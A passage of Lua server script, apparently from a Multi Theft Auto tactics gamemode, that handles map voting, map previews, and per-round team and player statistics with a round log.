                        executeVoteResult
                    };
                    if isTimer(votingTimer) then
                        killTimer(votingTimer);
                    end;
                    votingTimer = setTimer(onVotingFinish, voteDurationSec2 * 1000, 1);
                    if voterName ~= "Console" then
                        outputLangString(root, "voting_start", voterName, resourceDisplayName2);
                    end;
                end;
                return setTacticsData(voteInfo, "voting");
            elseif type(voteData) == "number" then
                voteInfo = getTacticsData("voting");
                if voteInfo and voteInfo.rows and #voteInfo.rows > 0 and voteInfo.cancel and voteData <= #voteInfo.rows then
                    if previousVote and previousVote > 0 then
                        voteInfo.rows[previousVote].votes = voteInfo.rows[previousVote].votes - 1;
                    end;
                    if previousVote == 0 then
                        voteInfo.cancel = voteInfo.cancel - 1;
                    end;
                    if voteData > 0 then
                        voteInfo.rows[voteData].votes = voteInfo.rows[voteData].votes + 1;
                        if voteInfo.rows[voteData].votes > 0.5 * getPlayerCount() then
                            setTacticsData(voteInfo, "voting");
                            onVotingFinish();
                            return;
                        end;
                    else
                        voteInfo.cancel = voteInfo.cancel + 1;
                        if voteInfo.cancel > 0.5 * getPlayerCount() then
                            setTacticsData(voteInfo, "voting");
                            onVotingFinish();
                            return;
                        end;
                    end;
                    return setTacticsData(voteInfo, "voting");
                end;
            end;
            return;
        end;
    end;
    onVotingFinish = function() 
        if isTimer(votingTimer) then
            killTimer(votingTimer);
        end;
        local finalVoteInfo = getTacticsData("voting");
        if finalVoteInfo and #finalVoteInfo.rows > 0 and finalVoteInfo.cancel then
            if #finalVoteInfo.rows > 1 then
                table.sort(finalVoteInfo.rows, function(rowA, rowB) 
                    return rowA.votes > rowB.votes;
                end);
            end;
            local winningOption = finalVoteInfo.rows[1];
            if winningOption.votes > 0 and winningOption.votes > finalVoteInfo.cancel and type(votingFunctions[winningOption.num]) == "function" then
                triggerEvent("onVotingResult", root, winningOption);
                if votingFunctions[winningOption.num](winningOption) then
                    return;
                end;
            end;
        end;
        outputLangString(root, "voting_falied");
        setTacticsData(nil, "voting");
        if getTacticsData("automatics") == "voting" and winTimer then
            nextMap();
        end;
    end;
    onPlayerPreview = function(previewMap) 
        if source ~= client then return end
        if not hasObjectPermissionTo(getThisResource(), "general.ModifyOtherObjects", false) then
            triggerClientEvent(source, "onClientPreviewMapLoading", root, false, {});
            outputLangString(source, "resource_have_not_permissions", getResourceName(getThisResource()), "general.ModifyOtherObjects");
            return;
        else
            local mapElementsList = {};
            local mapMetaXML2 = xmlLoadFile(":" .. previewMap .. "/meta.xml");
            for _, metaNode2 in ipairs(xmlNodeGetChildren(mapMetaXML2)) do
                if xmlNodeGetName(metaNode2) == "map" then
                    local mapDataXML2 = xmlLoadFile(":" .. previewMap .. "/" .. xmlNodeGetAttribute(metaNode2, "src"));
                    for _, dataNode in ipairs(xmlNodeGetChildren(mapDataXML2)) do
                        table.insert(mapElementsList, {
                            xmlNodeGetName(dataNode), 
                            xmlNodeGetAttributes(dataNode)
                        });
                    end;
                    xmlUnloadFile(mapDataXML2);
                end;
            end;
            xmlUnloadFile(mapMetaXML2);
            local foundMode = false;
            local pairsFunc8 = pairs;
            local modesDefinedTable = getTacticsData("modes_defined") or {};
            for modeKeyVote in pairsFunc8(modesDefinedTable) do
                if string.find(previewMap, modeKeyVote) == 1 then
                    foundMode = modeKeyVote;
                end;
            end;
            triggerClientEvent(source, "onClientPreviewMapLoading", root, foundMode, mapElementsList);
            return;
        end;
    end;
    addCommandHandler("endvote", stopVoting, false, false);
    addEvent("onPlayerVote", true);
    addEvent("onPlayerPreview", true);
    addEvent("onVotingResult");
    addEventHandler("onPlayerVote", root, onPlayerVote);
    addEventHandler("onPlayerPreview", root, onPlayerPreview);
end)();
(function(...) 
    local teamsStatData = {};
    local previousTeamsData = {};
    local roundLog = "";
    local previousRoundLog = "";
    local currentMapName = "";
    local previousMapName = "";
    local trackedStats = {
        Damage = true, 
        Kills = true, 
        Deaths = true
    };
    local elementIndexMap = {};
    setRoundStatisticData = function(...) 
        trackedStats = {};
        for _, statName in ipairs({
            ...
        }) do
            if type(statName) == "string" then
                trackedStats[statName] = true;
            end;
        end;
        triggerClientEvent(root, "onClientStatisticChange", root, ...);
        return true;
    end;
    onMapStarting = function(mapStartInfo) 
        teamsStatData = {};
        roundLog = "";
        elementIndexMap = {};
        currentMapName = mapStartInfo.name;
        local playingTeams = getElementsByType("team");
        table.remove(playingTeams, 1);
        local teamSidesMap2 = getTacticsData("Teamsides");
        local sideNamesArray = getTacticsData("SideNames");
        local logoBaseURL = getTacticsData("LogoLink") or "http://gta-rating.ru/forum/images/rml/";
        for _, statTeam in ipairs(playingTeams) do
            local teamColorR3, teamColorG3, teamColorB3 = getTeamColor(statTeam);
            table.insert(teamsStatData, {
                name = getTeamName(statTeam), 
                score = tonumber(getElementData(statTeam, "Score")), 
                side = sideNamesArray[2 - teamSidesMap2[statTeam] % 2], 
                r = teamColorR3, 
                g = teamColorG3, 
                b = teamColorB3, 
                players = {}, 
                image = nil
            });
            elementIndexMap[statTeam] = #teamsStatData;
            fetchRemote(logoBaseURL .. getTeamName(statTeam) .. ".png", onStatisticImageLoad, "", false, statTeam);
        end;
    end;
    onStatisticImageLoad = function(imageData, responseCode, teamForImage) 
        if responseCode ~= 0 or not elementIndexMap[teamForImage] then
            return;
        else
            teamsStatData[elementIndexMap[teamForImage]].image = imageData;
            return;
        end;
    end;
    outputRoundLog = function(logMessage, isTimestamp) 
        roundLog = roundLog .. "\n";
        if not isTimestamp then
            local elapsedTime = 0;
            local timeStart = getTacticsData("timestart");
            if timeStart then
                elapsedTime = math.max(0, isRoundPaused() and timeStart or getTickCount() - timeStart);
            end;
            local formattedElapsedTime = MSecToTime(elapsedTime, 0);
            roundLog = roundLog .. string.format("[%s] ", formattedElapsedTime);
        end;
        roundLog = roundLog .. removeColorCoding(logMessage);
    end;
    onRoundStart = function() 
        local currentRealTime = getRealTime();
        roundLog = string.format("[%02i:%02i - %i.%02i.%04i] Round start", currentRealTime.hour, currentRealTime.minute, currentRealTime.monthday, currentRealTime.month + 1, currentRealTime.year + 1900);
        for _, sideTeam2 in ipairs(getTacticsData("Sides")) do
            local playerNamesList = "";
            for _, playingPlayer2 in ipairs(getPlayersInTeam(sideTeam2)) do
                if getPlayerGameStatus(playingPlayer2) == "Play" then
                    if not elementIndexMap[playingPlayer2] then
                        local playerStatEntry = {
                            name = removeColorCoding(getPlayerName(playingPlayer2))
                        };
                        for statKeyName in pairs(trackedStats) do
                            playerStatEntry[statKeyName] = 0;
                        end;
                        table.insert(teamsStatData[elementIndexMap[sideTeam2]].players, playerStatEntry);
                        elementIndexMap[playingPlayer2] = #teamsStatData[elementIndexMap[sideTeam2]].players;
                    end;
                    playerNamesList = playerNamesList .. ", " .. removeColorCoding(getPlayerName(playingPlayer2));
                end;
            end;
            outputRoundLog(getTeamName(sideTeam2) .. ": " .. (#playerNamesList > 0 and string.sub(playerNamesList, 3) or ""), true);
        end;
        outputRoundLog("", true);
    end;
    onRoundFinish = function(winMessage, subMessage, _) 
        if winMessage then
            local formattedWinMessage = "";
            local formattedSubMessage = "";
            if type(winMessage) == "table" then
                if type(winMessage[1]) == "string" then
                    local winArgs2 = winMessage;
                    local messageKey3 = table.remove(winArgs2, 1);
                    formattedWinMessage = string.format(getString(tostring(messageKey3)), unpack(winArgs2));
                else
                    local messageID2 = winMessage[4];
                    local winArgs3 = winMessage;
                    table.remove(winArgs3, 1);
                    table.remove(winArgs3, 1);
                    table.remove(winArgs3, 1);
                    table.remove(winArgs3, 1);
                    formattedWinMessage = string.format(getString(tostring(messageID2)), unpack(winArgs3));
                end;
            elseif type(winMessage) == "string" then
                formattedWinMessage = getString(winMessage);
                if #formattedWinMessage == 0 then
                    formattedWinMessage = tostring(winMessage);
                end;
            else
                formattedWinMessage = tostring(winMessage);
            end;
            if subMessage then
                if type(subMessage) == "table" then
                    local subArgs = subMessage;
                    local subMessageKey = table.remove(subArgs, 1);
                    formattedSubMessage = string.format(getString(tostring(subMessageKey)), unpack(subArgs));
                elseif type(subMessage) == "string" then
                    formattedSubMessage = getString(subMessage);
                    if #formattedSubMessage == 0 then
                        formattedSubMessage = tostring(subMessage);
                    end;
                else
                    formattedSubMessage = tostring(subMessage);
                end;
                formattedSubMessage = " (" .. formattedSubMessage .. ")";
            end;
            outputRoundLog(formattedWinMessage .. formattedSubMessage);
        end;
        local allTeams2 = getElementsByType("team");
        table.remove(allTeams2, 1);
        for _, statTeam2 in ipairs(allTeams2) do
            if elementIndexMap[statTeam2] then
                teamsStatData[elementIndexMap[statTeam2]].score = tonumber(getElementData(statTeam2, "Score"));
            end;
        end;
        setTimer(callClientFunction, 1000, 1, root, "updateRoundStatistic", currentMapName, teamsStatData, roundLog);
        previousMapName = currentMapName;
        previousTeamsData = {
            unpack(teamsStatData)
        };
        previousRoundLog = roundLog;
    end;
    onPlayerDownloadComplete = function() 
        callClientFunction(source, "updateRoundStatistic", previousMapName, previousTeamsData, previousRoundLog, true);
    end;
    onElementDataChange = function(changedDataKey, oldDataValue2) 
        local elementType2 = getElementType(source);
        if elementType2 == "player" and changedDataKey == "Status" and getElementData(source, changedDataKey) == "Play" and not elementIndexMap[source] then
            local playerStatTeam = getPlayerTeam(source);
            if not elementIndexMap[playerStatTeam] then
                return;
            else
                local newPlayerStat = {
                    name = removeColorCoding(getPlayerName(source))
                };
                for statKey2 in pairs(trackedStats) do
                    newPlayerStat[statKey2] = 0;
                end;
                table.insert(teamsStatData[elementIndexMap[playerStatTeam]].players, newPlayerStat);
                elementIndexMap[source] = #teamsStatData[elementIndexMap[playerStatTeam]].players;
            end;
        end;
        if (elementType2 == "player" or elementType2 == "team") and trackedStats[changedDataKey] and elementIndexMap[source] then
            local statDifference = tonumber(getElementData(source, changedDataKey));
            if type(statDifference) == "number" and type(oldDataValue2) == "number" then
                statDifference = statDifference - oldDataValue2;
            else
                statDifference = 0;
            end;
            if elementType2 == "team" then
                teamsStatData[elementIndexMap[source]][changedDataKey] = teamsStatData[elementIndexMap[source]][changedDataKey] + statDifference;
            else
                local playerTeamForStat = getPlayerTeam(source);
                if elementIndexMap[playerTeamForStat] then
                    teamsStatData[elementIndexMap[playerTeamForStat]].players[elementIndexMap[source]][changedDataKey] = teamsStatData[elementIndexMap[playerTeamForStat]].players[elementIndexMap[source]][changedDataKey] + statDifference;
                end;
            end;
        end;
    end;
    onPlayerWasted = function(_, killerElement, weaponID4, bodyPart) 
        local deathMessage = nil;
        if killerElement then
            if killerElement ~= source then
                local killerType = getElementType(killerElement);
                if killerType == "player" then
                    deathMessage = getPlayerName(killerElement) .. " killed " .. getPlayerName(source);
                elseif killerType == "vehicle" then
                    deathMessage = getPlayerName(getVehicleController(killerElement)) .. " killed " .. getPlayerName(source) .. " (" .. getVehicleName(killerElement) .. ")";
                end;
            else
                deathMessage = getPlayerName(source) .. " committed suicide";
            end;
        else
            deathMessage = getPlayerName(source) .. " died";
        end;
        if weaponID4 then
            local weaponName = getWeaponNameFromID(weaponID4);
            if weaponName then
                deathMessage = deathMessage .. " (" .. weaponName .. ")";
            end;
        end;
        if bodyPart and getBodyPartName(bodyPart) then
            deathMessage = deathMessage .. " (" .. getBodyPartName(bodyPart) .. ")";
        end;
        outputRoundLog(removeColorCoding(deathMessage));
    end;
    onPauseToggle = function(isPaused, pauseDuration) 
        if isPaused then
            outputRoundLog("Game paused");
        else
            local formattedPauseTime = MSecToTime(pauseDuration, 0);
            outputRoundLog(string.format("[+%s] Game unpaused", formattedPauseTime), true);
        end;
    end;

    dataAntiChange = function(changedElementData, oldDataValue, newDataValue)
        if client and client ~= nil and source ~= nil then
            if getElementType(client) == "player" and getElementType(source) == "player" then
                if client ~= source then
                    if changedElementData == "spectateskin" and not hasObjectPermissionTo(client, "general.tactics_openpanel", false) then
                        setElementData(source, changedElementData, oldDataValue)
                    elseif changedElementData ~= "spectateskin" then
                        setElementData(source, changedElementData, oldDataValue)
                    end
                end
            end
        end
    end
    addEventHandler("onMapStarting", root, onMapStarting);
    addEventHandler("onRoundStart", root, onRoundStart);
    addEventHandler("onRoundFinish", root, onRoundFinish);
    addEventHandler("onPlayerDownloadComplete", root, onPlayerDownloadComplete);
    addEventHandler("onElementDataChange", root, onElementDataChange);
    addEventHandler("onPlayerWasted", root, onPlayerWasted);
    addEventHandler("onPauseToggle", root, onPauseToggle);
    addEventHandler("onElementDataChange", root, dataAntiChange)
end)();
